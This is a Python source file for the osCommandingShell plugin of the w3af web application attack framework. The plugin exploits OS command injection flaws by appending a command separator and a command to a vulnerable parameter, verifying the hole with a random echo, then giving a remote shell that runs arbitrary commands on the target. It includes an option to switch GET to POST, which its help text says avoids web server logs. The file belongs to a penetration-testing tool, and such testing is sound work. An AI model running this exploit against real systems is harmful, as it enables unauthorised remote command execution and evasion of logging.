'''
osCommandingShell.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''




# options
from core.data.options.option import option
from core.data.options.optionList import optionList

from core.data.kb.exec_shell import exec_shell as exec_shell
from core.data.fuzzer.fuzzer import createRandAlpha

from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
from core.controllers.w3afException import w3afException
import core.controllers.outputManager as om

from plugins.attack.payloads.decorators.exec_decorator import exec_debug


class osCommandingShell(baseAttackPlugin):
    '''
    Exploit OS Commanding vulnerabilities.
    
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # User configured parameter
        self._change_to_post = True
        self._url = ''
        self._separator = ';'
        self._data = ''
        self._inj_var = ''
        self._method = 'GET'

    def fastExploit( self ):
        '''
        Exploits a web app with osCommanding vuln, the settings are configured using setOptions()
        '''
        raise w3afException('Not implemented.')
    
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''        
        return 'shell'
    
    def getVulnName2Exploit( self ):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.osCommanding plugin finds an vuln, and saves it as:
        
        kb.kb.append( 'osCommanding' , 'osCommanding', vuln )
        
        Then the exploit plugin that exploits osCommanding ( attack.osCommandingShell ) should
        return 'osCommanding' in this method.
        '''        
        return 'osCommanding'

    def _generateShell( self, vuln ):
        '''
        @parameter vuln: The vuln to exploit.
        @return: The shell object based on the vulnerability that was passed as a parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verifyVuln( vuln ):
            
            if vuln.getMethod() != 'POST' and self._change_to_post and \
            self._verifyVuln( self.GET2POST( vuln ) ):
                msg = 'The vulnerability was found using method GET, but POST is being used'
                msg += ' during this exploit.'
                om.out.console( msg )
                vuln = self.GET2POST( vuln )
            else:
                msg = 'The vulnerability was found using method GET, tried to change the method to'
                msg += ' POST for exploiting but failed.'
                om.out.console( msg )
            
            # Create the shell object
            shell_obj = osShell( vuln )
            shell_obj.setUrlOpener( self._urlOpener )
            shell_obj.set_cut( self._header_length, self._footer_length )
            return shell_obj
            
        else:
            return None

    def _verifyVuln( self, vuln ):
        '''
        This command verifies a vuln. This is really hard work!

        @return : True if vuln can be exploited.
        '''
        # The vuln was saved to the kb as:
        # kb.kb.append( self, 'osCommanding', v )
        exploitDc = vuln.getDc()
        
        if exploitDc is None:
            om.out.error('You hitted bug #1948260. Please report how to reproduce it here:')
            bug_URL = 'https://sourceforge.net/tracker/index.php?func=detail&aid=1948260'
            bug_URL += '&group_id=170274&atid=853652'
            om.out.error( bug_URL )
            
        # Define a test command:
        rand = createRandAlpha( 8 )
        if vuln['os'] == 'windows':
            command = vuln['separator'] + 'echo ' + rand
            # TODO: Confirm that this works in windows
            rand = rand + '\n\n'
        else:
            command = vuln['separator'] + '/bin/echo ' + rand
            rand = rand + '\n'
            
        # Lets define the result header and footer.
        functionReference = getattr( self._urlOpener , vuln.getMethod() )
        exploitDc[vuln.getVar()] = command
        try:
            response = functionReference( vuln.getURL(), str(exploitDc) )
        except w3afException, e:
            om.out.error( str(e) )
            return False
        else:
            return self._define_exact_cut( response.getBody(), rand )
    
    def getOptions(self):
        '''
        @return: A list of option objects for this plugin.
        '''        
        d1 = 'URL to exploit with fastExploit()'
        o1 = option('url', self._url, d1, 'string')
        
        d2 = 'HTTP method to use with fastExploit()'
        o2 = option('method', self._method, d2, 'string')

        d3 = 'Data to send with fastExploit()'
        o3 = option('data', self._data, d3, 'string')

        d4 = 'Variable where to inject with fastExploit()'
        o4 = option('injvar', self._inj_var, d4, 'string')

        d5 = 'If the vulnerability was found in a GET request, try to change the method to POST'
        d5 += ' during exploitation.'
        h5 = 'If the vulnerability was found in a GET request, try to change the method to POST'
        h5 += 'during exploitation; this is usefull for not being logged in the webserver logs.'
        o5 = option('changeToPost', self._change_to_post, d5, 'boolean', help=h5)
        
        d6 = 'The command separator to be used.'
        h6 = 'In an OS commanding vulnerability, a command separator is used to separate the'
        h6 += ' original command from the customized command that the attacker want\'s to execute.'
        h6 += ' Common command separators are ;, & and |.'
        o6 = option('separator', self._separator, d6, 'string', help=h6)
        
        ol = optionList()
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        ol.add(o5)
        ol.add(o6)
        return ol

    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptions().
        
        @parameter OptionList: A dictionary with the options for the plugin.
        @return: No value is returned.
        ''' 
        if optionsMap['method'].getValue() not in ['GET', 'POST']:
            raise w3afException('Unknown method.')
        else:
            self._method = optionsMap['method'].getValue()

        self._data = optionsMap['data'].getValue()
        self._inj_var = optionsMap['injvar'].getValue()
        self._separator = optionsMap['separator'].getValue()
        self._url = optionsMap['url'].getValue()
        self._change_to_post = optionsMap['changeToPost'].getValue()

            
    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.8
        
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits os commanding vulnerabilities and returns a remote shell.
        
        Seven configurable parameters exist:
            - changeToPost
            - url
            - method
            - injvar
            - data
            - separator
            - generateOnlyOne
        '''

class osShell(exec_shell):
 
    @exec_debug
    def execute(self, command):
        '''
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        @parameter command: The command to handle ( ie. "ls", "whoami", etc ).
        @return: The result of the command.
        '''
        functionReference = getattr( self._urlOpener , self.getMethod() )
        exploitDc = self.getDc()
        exploitDc[ self.getVar() ] = self['separator'] + command
        try:
            response = functionReference( self.getURL() , str(exploitDc) )
        except w3afException, e:
            return 'Error "' + str(e) + '" while sending command to remote host. Please try again.'
        else:
            return self._cut( response.getBody() )
            
    def end( self ):
        om.out.debug('osShell cleanup complete.')
        
    def getName( self ):
        return 'osCommandingShell'
        
